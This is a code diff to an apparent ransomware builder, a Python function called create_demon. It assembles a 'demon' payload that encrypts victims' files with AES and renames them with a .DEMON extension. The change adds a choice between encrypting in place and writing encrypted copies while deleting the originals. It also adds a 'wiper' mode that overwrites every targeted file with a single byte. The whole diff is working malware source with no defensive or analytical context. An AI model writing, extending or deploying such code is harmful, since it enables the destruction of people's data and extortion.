@@ -1,6 +1,6 @@
 import platform
 
-def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug, ext, dirs, destruct, working_dir, runas):
+def create_demon(host, port, fullscreen, demo, type, method, msg, img_base64, mode, debug, ext, dirs, destruct, working_dir, runas):
     demon = """import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
 from pathlib import Path
@@ -247,10 +247,23 @@ def encrypt_file(file_name, key):
     with open(file_name, 'rb') as fo:
         plaintext = fo.read()
     enc = encrypt(plaintext, key)
+    <method>
+"""
+        override = """
     with open(file_name, 'wb') as fo:
         fo.write(enc)
     os.rename(file_name, file_name + '.DEMON')
 """
+        copy = """
+    with open(file_name + '.DEMON', 'wb') as fo:
+        fo.write(enc)
+    os.remove(file_name)
+"""
+        if method == 'override':
+            type = type.replace('<method>', override)
+        elif method == 'copy':
+            type = type.replace('<method>', copy)
+
         demon = demon.replace('<import_random>', 'from Crypto import Random')
         demon = demon.replace('<import_aes>', 'from Crypto.Cipher import AES')
         demon = demon.replace('<type>', type)
@@ -262,13 +275,37 @@ def encrypt_file(file_name, key):
         plaintext = fo.read()
     enc = aes.encrypt(plaintext)
 
+    <method>
+"""
+
+        override = """
     with open(file_name, 'wb') as fo:
         fo.write(enc)
     os.rename(file_name, file_name + '.DEMON')
 """
+        copy = """
+    with open(file_name + '.DEMON', 'wb') as fo:
+        fo.write(enc)
+    os.remove(file_name)
+"""
+        if method == 'override':
+            type = type.replace('<method>', override)
+        elif method == 'copy':
+            type = type.replace('<method>', copy)
+
         demon = demon.replace('<import_random>', '')
         demon = demon.replace('<import_aes>', 'import pyaes')
         demon = demon.replace('<type>', type)
+    elif type == 'wiper':
+        type = """def encrypt_file(file_name, key):
+        with open(file_name, 'wb') as fo:
+            fo.write(b' ')
+        os.rename(file_name, file_name + '.DEMON')
+"""
+        demon = demon.replace('<import_random>', '')
+        demon = demon.replace('<import_aes>', '')
+        demon = demon.replace('<type>', type)
+
 
     if debug == 0:
         demon = demon.replace('<debug>', '')
